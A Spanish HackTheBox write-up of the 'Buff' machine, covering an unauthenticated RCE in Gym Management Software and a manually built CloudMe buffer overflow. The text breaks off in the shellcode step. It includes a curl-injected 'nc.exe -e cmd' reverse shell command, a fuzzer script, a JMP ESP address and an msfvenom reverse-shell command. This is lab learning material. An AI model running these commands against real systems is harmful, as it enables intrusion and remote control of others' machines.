<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Buff Writeup [ES] - HackTheBox" /><meta property="og:locale" content="en" /><meta name="description" content="Resumen" /><meta property="og:description" content="Resumen" /><link rel="canonical" href="https://brsalcedom.github.io/Buff-Writeup-HackTheBox/" /><meta property="og:url" content="https://brsalcedom.github.io/Buff-Writeup-HackTheBox/" /><meta property="og:site_name" content="brsalcedom" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-05-19T17:00:00-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Buff Writeup [ES] - HackTheBox" /><meta name="twitter:site" content="@Cervant_0" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-05-19T17:00:00-04:00","datePublished":"2022-05-19T17:00:00-04:00","description":"Resumen","headline":"Buff Writeup [ES] - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"https://brsalcedom.github.io/Buff-Writeup-HackTheBox/"},"url":"https://brsalcedom.github.io/Buff-Writeup-HackTheBox/"}</script><title>Buff Writeup [ES] - HackTheBox | brsalcedom</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="brsalcedom"><meta name="application-name" content="brsalcedom"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/avatar.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">brsalcedom</a></div><div class="site-subtitle font-italic">Personal Cybersecurity & Pentesting blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/brsalcedom" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Cervant_0" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['brsalcedom','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Buff Writeup [ES] - HackTheBox</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 620 410'%3E%3C/svg%3E" data-src="/images/HTB/Buff/00-banner.png" class="preview-img bg" alt="Preview Image" width="620" height="410" data-proofer-ignore><h1 data-toc-skip>Buff Writeup [ES] - HackTheBox</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/Cervant_0">Bryan Salcedo</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1652994000" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-05-19 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2364 words"> <em>13 min</em> read</span></div></div></div><div class="post-content"><h1 id="resumen">Resumen</h1><p><a href="https://app.hackthebox.com/machines/263">Buff</a> es una máquina <strong>Windows</strong> de dificultad Easy de la plataforma de <a href="https://app.hackthebox.com/">Hack The Box</a>, incluye abuso y explotación de un CMS desactualizado en la intrusión, y un buffer overflow stack-based para la fase de escalada de privlegios.</p><p>Aprovecharé esta ocasión para practicar y documentar la parte del Buffer Overflow, por lo que no será directamente un writeup de como rootear la máquina, sino una oportunidad para ganar training en esta área.</p><hr /><h1 id="enumeración">Enumeración</h1><h2 id="nmap"><span class="mr-2">NMAP</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>En esta fase utilizaremos los siguientes scripts personalizados.</p><blockquote><p><strong>nmap-scan.sh</strong>: Realiza SYN-SCAN a los 65535 puertos y deposita el output al archivo <code class="language-plaintext highlighter-rouge">allPorts.gnmap</code></p></blockquote><blockquote><p><strong>nmap-services.sh</strong>: Lee y parsea un archivo “grepeable” de nmap obtiene IP y puertos para realizar un escaneo de servicios a estos últimos.</p></blockquote><ul><li><code class="language-plaintext highlighter-rouge">sudo nmap-scan.sh buff.htb</code><li><code class="language-plaintext highlighter-rouge">nmap-services.sh allPorts.gnmap</code></ul><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>nmap -sCV -p7680,8080 -n -oN tcp-ports.nmap buff.htb -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-19 18:45 -04
Nmap scan report for buff.htb
Host is up (0.16s latency).

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.42 seconds
</pre></table></code></div></div><p>Por lo visto solo disponemos de dos puertos accesibles, el <code class="language-plaintext highlighter-rouge">7680</code> que no reporta mucha información, y el <code class="language-plaintext highlighter-rouge">8080</code> en donde existe un servicio web.</p><h2 id="enumeración-web---8080"><span class="mr-2">Enumeración Web - 8080</span><a href="#enumeración-web---8080" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Al ingresar, lo primero que se visualiza es un sitio web que va de la mano con la temática de la máquina, simula ser la página web de un gimnasio.</p><p><img data-src="/images/HTB/Buff/05-website.png" alt="" data-proofer-ignore></p><p>A nivel de las tecnologías utilizadas para crear el sitio, tenemos <code class="language-plaintext highlighter-rouge">php</code> y <code class="language-plaintext highlighter-rouge">javascript (jquery)</code>.</p><p><img data-src="/images/HTB/Buff/07-wappalyzer.png" alt="" data-proofer-ignore></p><p>Investigando la página web, no vemos mucha información interesante, a excepción de el mensaje <code class="language-plaintext highlighter-rouge">Made using Gym Management Software 1.0</code> en la pestaña <strong>Contact</strong>, esto inmediatamente nos hace pensar que se utilizó un <strong>CMS</strong> para construir la web y al ser una máquina de dificultad Easy, es posible que exista alguna forma de explotarlo.</p><p><img data-src="/images/HTB/Buff/10-contact-page.png" alt="" data-proofer-ignore></p><p>Si tomamos ese nombre y buscamos por <em>Gym Management</em> en searchsploit, encontramos lo siguiente.</p><p><img data-src="/images/HTB/Buff/15-searchsploit.png" alt="" data-proofer-ignore></p><p>De lo encontrado, llama la atención un script en particular, ya que permite ejecución remota de comandos <strong>RCE</strong> sin estar autenticado.</p><h1 id="consola-como-shaun">Consola como Shaun</h1><p>Descargamos el exploit y lo renombramos como <code class="language-plaintext highlighter-rouge">exploit.py</code>.</p><p><img data-src="/images/HTB/Buff/18-download-exploit.png" alt="" data-proofer-ignore></p><p>Dentro de su código hay una explicación de como se aprovecha de una vulnerabilidad del CMS para subir un archivo <code class="language-plaintext highlighter-rouge">.php</code> con una simple webshell para ejecutar comandos en la máquina remota.</p><p><img data-src="/images/HTB/Buff/20-exploit.png" alt="" data-proofer-ignore></p><p>Ejecutamos y solamente nos solicita proporcionar la dirección URL del sitio web.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python2.7 exploit.py http://buff.htb:8080/
</pre></table></code></div></div><p><img data-src="/images/HTB/Buff/23-exploit-2.png" alt="" data-proofer-ignore></p><p>Enviamos la URL y ya nos conecta a la webshell, en donde ya es posible ejecutar comandos.</p><p>En otra pestaña compartiré a través de smb el binario de <code class="language-plaintext highlighter-rouge">nc.exe</code> para entablar una reverse shell en condiciones.</p><p><img data-src="/images/HTB/Buff/26-share-nc.png" alt="" data-proofer-ignore></p><p>Ahora bien, solo resta inyectar el comando para la reverse shell utilizando el <code class="language-plaintext highlighter-rouge">nc.exe</code> compartido previamente. En esta ocasión el comando lo inyectaré directamente con <code class="language-plaintext highlighter-rouge">curl</code>, ya que según la documentación del exploit, se ha subido un archivo llamado <code class="language-plaintext highlighter-rouge">kamehameha.php</code>, el cual recibe la variable <code class="language-plaintext highlighter-rouge">telepathy</code> a través del método <strong>GET</strong>.</p><p>En mi caso, la ruta completa es: <code class="language-plaintext highlighter-rouge">http://buff.htb:8080/upload/kamehameha.php</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl <span class="nt">-s</span> <span class="s2">"http://buff.htb:8080/upload/kamehameha.php"</span> <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s1">'telepathy=\\10.10.14.116\shared\nc.exe -e cmd 10.10.14.116 443'</span>
</pre></table></code></div></div><p>Ejecutamos y conseguimos una shell como el usuario <strong>shaun</strong>.</p><p><img data-src="/images/HTB/Buff/28-shell-as-shaun.png" alt="" data-proofer-ignore></p><p>Una vez dentro, lo siguiente sería enumerar internamente en búsqueda de métodos para escalar privilegios.</p><p>Antes de ejecutar herramientas de <em>recon</em> como <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WinPeas</a>, una simple enumeración del directorio home de nuestro usuario nos revela un <code class="language-plaintext highlighter-rouge">.exe</code> interesante.</p><p><img data-src="/images/HTB/Buff/35-cloudme-downloads.png" alt="" data-proofer-ignore></p><p>Una búsqueda rápida del binario en google nos indica que es vulnerable a <strong>Buffer Overflow</strong> y que éste levanta un servicio en el puerto 8888.</p><p><img data-src="/images/HTB/Buff/39-cloudme-search.png" alt="" data-proofer-ignore></p><p>Al lanzar un <code class="language-plaintext highlighter-rouge">netstat</code> dentro de la máquina vemos que existe un servicio ejecutándose bajo ese puerto, pero sólo <strong>localmente</strong>.</p><blockquote><p>Este servicio deberá ser expuesto más adelante con la ayuda de <a href="https://github.com/jpillora/chisel">chisel</a>.</p></blockquote><p><img data-src="/images/HTB/Buff/40-netstat.png" alt="" data-proofer-ignore></p><p>Si buscamos <strong>CloudMe</strong> en searchsploit, al igual que con el CMS, vemos que existen exploits públicos para abusar del Buffer Overflow.</p><p><img data-src="/images/HTB/Buff/38-cloudme-searchsploit.png" alt="" data-proofer-ignore></p><p>Considerando que la máquina ya ha sido demasiado fácil y lanzar otro exploit de un tercero no tendría mucho mérito, descargaremos el binario vulnerable y construiremos el exploit de forma manual. Podemos descargarlo desde la máquina <em>Buff</em>, o bien, utilizar el enlace proporcionado en el exploit.</p><ul><li><code class="language-plaintext highlighter-rouge">searchsploit -x windows/remote/48389.py</code></ul><p><img data-src="/images/HTB/Buff/42-cloudme-bof-poc.png" alt="" data-proofer-ignore></p><ul><li>Enlace: <a href="https://www.cloudme.com/downloads/CloudMe_1112.exe">https://www.cloudme.com/downloads/CloudMe_1112.exe</a></ul><hr /><h1 id="consola-como-administrator">Consola como Administrator</h1><h2 id="buffer-overflow"><span class="mr-2">Buffer Overflow</span><a href="#buffer-overflow" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Ya sabemos que CloudMe en su versión 1.11.2 es vulnerable a desbordamiento de buffer, procederemos a crear un ambiente local para explotarlo y depurar la aplicación.</p><h3 id="requisitos"><span class="mr-2">Requisitos</span><a href="#requisitos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ul><li>Una VM de Windows (32 bits)<li>Immunity Debugger + <a href="https://github.com/corelan/mona/blob/master/mona.py">mona.py</a><li>Abrir puerto 8888 a nivel de red local o crear túnel con chisel</ul><p>Para explotar correctamente un BOF stack-based de 32 bits, el orden será el siguiente:</p><ol><li><a href="#obteniendo-el-offset">Fuzzear para identificar el offset</a><li><a href="#tomar-control-de-eip">Tomar control de EIP</a><li><a href="#identificar-badchars">Identificar badchars</a><li><a href="#obtener-jmp-esp">Descubrir una operación jmp_esp para asignar al EIP</a><li><a href="#generar-shellcode">Generar shellcode</a><li><a href="#exploit">Juntar todo en un script para explotar remotamente a la máquina víctima</a></ol><blockquote><p><strong>Disclaimer:</strong> No soy ningún experto en explotación de binarios / bof, pero realizo este tipo de contenido para utilizarlo como ayuda-memoria o para quien pueda serle de utilidad.</p></blockquote><blockquote><p>Trataré explicar paso a paso de la mejor manera posible cada punto sin entrar al detalle de como funciona todo a bajo nivel, para eso al final de este post en <a href="#recursos">Recursos</a> dejaré más información de otras fuentes mucho más detalladas.</p></blockquote><h3 id="preparación-entorno"><span class="mr-2">Preparación entorno</span><a href="#preparación-entorno" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>En mi caso estoy utilizando una VM de Windows 10 de 32 bits y ya tengo instalado <strong>CloudMe</strong> y funcionando correctamente.</p><p><img data-src="/images/HTB/Buff/65-cloudme-installed.png" alt="" data-proofer-ignore></p><p>Antes de iniciar <strong>Immunity Debugger</strong>, es importante contar con mona instalado, para ésto es simplemente descargarlo desde <a href="https://github.com/corelan/mona/blob/master/mona.py">Github</a> y copiarlo a la carpeta <code class="language-plaintext highlighter-rouge">PyCommands</code> dentro del directorio de instalación de Immunity.</p><p>En mi caso la ruta completa es:</p><ul><li><code class="language-plaintext highlighter-rouge">C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands</code></ul><p><img data-src="/images/HTB/Buff/64-mona.png" alt="" data-proofer-ignore></p><p>Dentro de Immunity existe una barra inferior que nos permitirá ejecutar comandos, acá es donde podremos llamar a <code class="language-plaintext highlighter-rouge">mona.py</code>. Lo primero a configurar es el directorio de trabajo en donde <em>mona</em> enviará el output de los comandos ejecutados.</p><ul><li><code class="language-plaintext highlighter-rouge">!mona config -set workingfolder c:\Users\Cervant\Desktop\%p</code></ul><p><img data-src="/images/HTB/Buff/64-mona-config.png" alt="" data-proofer-ignore></p><blockquote><p><strong>%p</strong> creará un directorio con el nombre del programa que estemos depurando.</p></blockquote><p>Una vez con esto listo, nos sincronizaremos al proceso de CloudMe.</p><p>Iremos a <strong><em>File &gt; Attach</em></strong> o pulsaremos <code class="language-plaintext highlighter-rouge">CTRL + F1</code> y nos mostrará una lista de los procesos del sistema. Acá solamente es buscar CloudMe y darle a Attach.</p><p><img data-src="/images/HTB/Buff/66-attach-process-cloudme.png" alt="" data-proofer-ignore></p><p>Ya en este punto solo resta darle al botón de <em>play</em> para comenzar con la depuración.</p><p><img data-src="/images/HTB/Buff/67-start-debug.png" alt="" data-proofer-ignore></p><p>Importante considerar que cada vez que provoquemos un desbordamiento del buffer, la ejecución de la aplicación se corromperá y cerrará. Aquí tenemos la opción de volver a abrir CloudMe de manera manual y sincronizarnos al proceso con Immunity como fué mostrado anteriormente, o bien presionar <code class="language-plaintext highlighter-rouge">&lt;&lt;</code> para que Immunity haga esta tarea por nosotros.</p><p><img data-src="/images/HTB/Buff/68-restart-program.png" alt="" data-proofer-ignore></p><p>Nos aseguramos que Immunity se encuentra sincronizado a CloudMe, en estado <strong>Running</strong> y continuamos al siguiente paso.</p><p><img data-src="/images/HTB/Buff/69-immunity-debugger.png" alt="" data-proofer-ignore></p><hr /><h3 id="obteniendo-el-offset"><span class="mr-2">Obteniendo el offset</span><a href="#obteniendo-el-offset" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Normalmente crearía un fuzzer automático que vaya incrementando su valor en bytes por cada iteración y que envíe esa data a la app vulnerable, como el que se muestra a continuación.</p><div file="fuzzer.py" class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="fuzzer.py"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">8888</span>
<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'error'</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mi">100</span> 
        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[+] Enviando {} bytes"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)))</span> 
        <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</pre></table></code></div></div><p>Pero en este caso no tenemos forma de saber si hemos tumbado el servicio remoto, ya que estamos replicando el puerto del servicio con chisel y éste siempre se encontrará disponible, por lo tanto, no obtendremos un problema de conexión como normalmente ocurriría.</p><p>Lo que haremos a continuación es crear directamente nuestro <code class="language-plaintext highlighter-rouge">bof.py</code> e ir modíficandolo a medida que necesitemos hacerlo.</p><p><img data-src="/images/HTB/Buff/70-bof-1.png" alt="" data-proofer-ignore></p><p>Ejecutaremos <code class="language-plaintext highlighter-rouge">bof.py</code>.</p><p><img data-src="/images/HTB/Buff/71-run-bof-1.png" alt="" data-proofer-ignore></p><p>Validamos en la VM Windows e identificamos lo siguiente:</p><ol><li>El debugger se encuentra en estado “Paused” lo que indica que efectivamente desbordamos el buffer.<li>Hemos sobrescrito el <strong>EIP</strong> con nuestras “A” (41 en hexadecimal).<li>Tambien vemos que el <strong>ESP</strong> ha sido sobrescrito.</ol><p><img data-src="/images/HTB/Buff/72-bof1-debug.png" alt="" data-proofer-ignore></p><p>Continuando, ahora debemos buscar un método para calcular exactamente cuanto es el <strong>offset</strong>, es decir, cuantas “A” debemos inyectar antes de sobrescribir el <strong>EIP</strong>. Para esto hay una utilidad muy cómoda de la suite de <strong>metasploit</strong> llamada <code class="language-plaintext highlighter-rouge">pattern_create.rb</code> que nos permitirá crear una cadena de caracteres especialmente diseñada.</p><p><img data-src="/images/HTB/Buff/73-pattern-create.png" alt="" data-proofer-ignore></p><p>También tendríamos la opcion de generar un patrón desde <strong>mona</strong>.</p><ul><li><code class="language-plaintext highlighter-rouge">!mona pc 2000</code></ul><p><img data-src="/images/HTB/Buff/73-pattern-create-mona.png" alt="" data-proofer-ignore></p><p>Nos quedaremos con el obtenido desde metasploit, ejecutamos nuevamente y enviamos la nueva cadena como payload. En esta ocasión deberemos tomar nota del valor de <strong>EIP</strong> para obtener el offset.</p><p><img data-src="/images/HTB/Buff/74-run-with-pattern.png" alt="" data-proofer-ignore></p><p>Tomamos ese valor y de vuelta en nuestra máquina, ejecutaremos <code class="language-plaintext highlighter-rouge">pattern_offset.rb</code> entregándole el valor obtenido anteriormente y anteponiendo <code class="language-plaintext highlighter-rouge">0x</code>.</p><p><img data-src="/images/HTB/Buff/75-pattern-offset.png" alt="" data-proofer-ignore></p><p>Otro método para obtener este valor, es utilizando mona. Al comando es necesario proporcionarle la longitud de la cadena creada anteriormente.</p><ul><li><code class="language-plaintext highlighter-rouge">!mona findmsp -distance 2000</code></ul><p><img data-src="/images/HTB/Buff/76-pattern-offset-mona.png" alt="" data-proofer-ignore></p><p>El output muestra exactamente el mismo resultado, <strong>1052</strong> de offset.</p><p>Lo cómodo de <strong>mona</strong> es que también guardará el resultado de cada comando en un archivo dentro de la carpeta de trabajo</p><hr /><h3 id="tomar-control-de-eip"><span class="mr-2">Tomar control de EIP</span><a href="#tomar-control-de-eip" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Ahora que sabemos que el offset es 1052, modificaremos el payload enviado para validar que estamos en lo correcto. Inyectaremos “A” los 1052 primeros bytes, luego “B” los siguientes 4 bytes (EIP) y por último “C” 500 veces que irán a la pila (ESP).</p><p>Nuestro script quedaría de la siguiente forma.</p><p><img data-src="/images/HTB/Buff/78-script-controlling-eip.png" alt="" data-proofer-ignore></p><p>Verificamos desde el debugger y efectivamente vemos que <strong>EIP</strong> vale “42424242” lo cual corresponde a “BBBB”. También se valida que las “C” fueron inyectadas a <strong>ESP</strong>.</p><p><img data-src="/images/HTB/Buff/77-controlling-eip.png" alt="" data-proofer-ignore></p><p>Si en la dirección de ESP damos <em>clic derecho</em> y seleccionamos <strong>Follow in Dump</strong>, tendremos una vista más cómoda de como se ha inyectado el payload.</p><p><img data-src="/images/HTB/Buff/79-follow-dump-esp.png" alt="" data-proofer-ignore></p><hr /><h3 id="identificar-badchars"><span class="mr-2">Identificar badchars</span><a href="#identificar-badchars" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>El próximo paso es identificar los badchars, es decir, carácteres que deben ser omitidos del shellcode para evitar problemas durante su ejecución, uno que debe ser omitido por defecto es el caracter NULL <code class="language-plaintext highlighter-rouge">\x00</code>.</p><p>Generaremos un bytearray con mona excluyendo de una vez el byte null.</p><ul><li><code class="language-plaintext highlighter-rouge">!mona bytearray -b "\x00"</code></ul><p><img data-src="/images/HTB/Buff/80-bytearray-mona.png" alt="" data-proofer-ignore></p><p>Ayudándonos de <code class="language-plaintext highlighter-rouge">python</code> haremos lo mismo en nuestro Linux.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x"</span> <span class="o">+</span> <span class="s">"{:02x}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
<span class="k">print</span><span class="p">()</span>
</pre></table></code></div></div><p>Ahora la idea es agregar estos badchars a nuestro payload y enviarlos justo después del <strong>EIP</strong>, de esta manera se inyectarán en <strong>ESP</strong> y tendremos una forma de validar si existe algún otro <strong>badchar</strong>.</p><p><img data-src="/images/HTB/Buff/81-bof-badchars.png" alt="" data-proofer-ignore></p><p>Enviamos y verificamos que hemos correctamente desbordado el buffer e insertado nuestros caracteres dentro de <strong>ESP</strong>.</p><p><img data-src="/images/HTB/Buff/82-badchars-dump.png" alt="" data-proofer-ignore></p><p>Esto se puede enumerar manualmente realizando una comparación de cada caracter enviado con cada caracter presente en la pila, si hay alguno que no aparezca acá desde el lado del debugger, quiere decir que es un badchar. Afortunadamente existe una manera más fácil de realizarlo con la ayuda de mona.</p><p>Utilizaremos el bytearray creado anteriormente y lo compararemos con lo que hay insertado en ESP. Antes de ejecutar deberemos obtener la dirección de ESP.</p><p><img data-src="/images/HTB/Buff/83-copy-esp-address.png" alt="" data-proofer-ignore></p><p>Ahora con todos los datos, comparamos.</p><ul><li><code class="language-plaintext highlighter-rouge">!mona compare -f C:\Users\Cervant\Desktop\CloudMe\bytearray.bin -a 00A3D3D0</code></ul><p><img data-src="/images/HTB/Buff/84-mona-compare.png" alt="" data-proofer-ignore></p><p>Como se puede apreciar, recibimos un mensaje que dice “Unmodified” lo que indica que no existe ningún otro badchar para esta aplicación en particular.</p><hr /><h3 id="obtener-jmp-esp"><span class="mr-2">Obtener JMP ESP</span><a href="#obtener-jmp-esp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Ahora toca el turno de obtener un valor válido para EIP, en otras palabras, deberemos encontrar una operación JMP ESP que nos permita acceder al shellcode que insertaremos.</p><ul><li><code class="language-plaintext highlighter-rouge">!mona jmp -r esp -cpb "\x00"</code></ul><p><img data-src="/images/HTB/Buff/85-jmp-esp.png" alt="" data-proofer-ignore></p><p>Nos quedaremos con la dirección <code class="language-plaintext highlighter-rouge">69A5F0EF</code> y la agregaremos al exploit.</p><hr /><h3 id="generar-shellcode"><span class="mr-2">Generar shellcode</span><a href="#generar-shellcode" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Por último, deberemos generar un shellcode que nos permita obtener una reverse shell.</p><ul><li><code class="language-plaintext highlighter-rouge">msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=192.168.1.142 LPORT=443 EXITFUNC=thread -b '\x00' -f python -v shellcode</code></ul><div class="table-wrapper"><table><thead><tr><th>Parámetro<th>Definición<tbody><tr><td><code class="language-plaintext highlighter-rouge">-p</code><td>Payload a utilizar<tr><td><code class="language-plaintext highlighter-rouge">-a</code><td>Arquitectura (x64/x86)<tr><td><code class="language-plaintext highlighter-rouge">-b</code><td>Badchars a omitir<tr><td><code class="language-plaintext highlighter-rouge">-f</code><td>Formato en que se exportará el resultado<tr><td><code class="language-plaintext highlighter-rouge">-v</code><td>Definición de variable<tr><td><code class="language-plaintext highlighter-rouge">LHOST</code><td>Host que recibirá la conexión (IP)<tr><td><code class="language-plaintext highlighter-rouge">LPORT</code><td>Puerto por el que se recibirá la 